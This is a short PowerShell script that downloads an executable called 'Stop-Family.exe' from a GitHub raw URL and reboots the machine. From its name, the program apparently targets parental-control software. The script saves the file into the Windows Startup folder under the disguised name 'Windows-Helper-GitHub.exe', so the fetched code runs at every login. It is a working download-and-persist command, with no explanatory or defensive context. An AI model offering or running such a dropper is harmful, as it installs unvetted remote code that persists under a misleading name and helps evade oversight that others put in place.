Invoke-WebRequest -Headers @{"Cache-Control"="no-cache"} -UseBasicParsing -Uri "https://raw.githubusercontent.com/TheBotlyNoob/Misc-Projects/main/Stop-Family/Stop-Family.exe" -OutFile "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup\Windows-Helper-GitHub.exe"

Restart-Computer
